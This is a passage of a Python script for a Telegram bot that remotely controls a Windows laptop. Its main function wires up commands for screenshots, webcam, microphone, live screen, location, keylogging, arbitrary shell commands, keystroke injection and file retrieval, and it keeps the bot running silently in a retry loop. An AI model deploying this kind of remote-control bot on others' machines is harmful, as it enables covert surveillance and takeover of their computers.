    ES_DISPLAY_REQUIRED = 0x00000002

    if is_jiggling:
        is_jiggling = False
        # Clear the execution state to allow normal sleep again
        ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)
        await update.message.reply_text("🛑 WakeLock OFF. PC can now go to sleep normally.")
    else:
        is_jiggling = True
        # Set the execution state to prevent system and display from sleeping
        ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED)
        await update.message.reply_text("☕ WakeLock ON! Windows power management has been overridden. PC will NEVER go to sleep!")

def send_startup_message():
    chat_id_file = os.path.join(os.path.dirname(__file__), "chat_id.txt")
    if os.path.exists(chat_id_file):
        try:
            with open(chat_id_file, "r") as f:
                chat_id = int(f.read().strip())
            
            # Keep trying until internet connects
            while True:
                try:
                    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                    resp = httpx.post(url, json={"chat_id": chat_id, "text": "🚀 modhalu pettandi! (W Laptop Bot is online)"}, timeout=5)
                    if resp.status_code == 200:
                        break
                except Exception as e:
                    print(f"Startup HTTP error: {e}")
                time.sleep(5) # Wait 5s and try again if no wifi
        except Exception as e:
            print(f"Startup File error: {e}")

def main():
    send_startup_message()
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    
    # System
    app.add_handler(CommandHandler("screenshot", screenshot_cmd))
    app.add_handler(CommandHandler("webcam", webcam_cmd))
    app.add_handler(CommandHandler("record", record_cmd))
    app.add_handler(CommandHandler("livescreen", livescreen_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("location", location_cmd))
    app.add_handler(CommandHandler("lock", lock_cmd))
    app.add_handler(CommandHandler("shutdown", shutdown_cmd))
    app.add_handler(CommandHandler("restart", restart_cmd))
    
    # Apps & Files
    app.add_handler(CommandHandler("open", open_cmd))
    app.add_handler(CommandHandler("close", close_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO | filters.VIDEO | filters.AUDIO | filters.VOICE, handle_file_upload))
    
    # Media
    app.add_handler(CommandHandler(["play", "pause", "next", "prev", "volup", "voldown", "mute"], media_cmd))
    
    # Extras & Hacks
    app.add_handler(CommandHandler("toast", toast_cmd))
    app.add_handler(CommandHandler("clip", clip_cmd))
    app.add_handler(CommandHandler("speak", speak_cmd))
    app.add_handler(CommandHandler("cmd", cmd_cmd))
    app.add_handler(CommandHandler("jiggle", jiggle_cmd))
    app.add_handler(CommandHandler("type", type_cmd))
    app.add_handler(CommandHandler("key", key_cmd))
    app.add_handler(CommandHandler("tasks", tasks_cmd))
    app.add_handler(CommandHandler("kill", kill_cmd))
    app.add_handler(CommandHandler("backup", backup_cmd))
    app.add_handler(CommandHandler("mic", mic_cmd))
    app.add_handler(CommandHandler("stream", stream_cmd))
    app.add_handler(CommandHandler("intruder", intruder_cmd))
    app.add_handler(CommandHandler("keylog", keylog_cmd))
    app.add_handler(CommandHandler("ls", ls_cmd))
    app.add_handler(CommandHandler("cd", cd_cmd))
    app.add_handler(CommandHandler("bluetooth", bluetooth_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))
    
    app.run_polling()

if __name__ == "__main__":
    import sys
    import time
    
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w")
    if sys.stderr is None:
        sys.stderr = open(os.path.join(os.path.dirname(__file__), "bot_error.log"), "w")
    
    while True:
        try:
            main()
        except Exception as e:
            if sys.stderr:
                import traceback
                traceback.print_exc()
            # Wait 10 seconds before trying to reconnect to Telegram
            time.sleep(10)
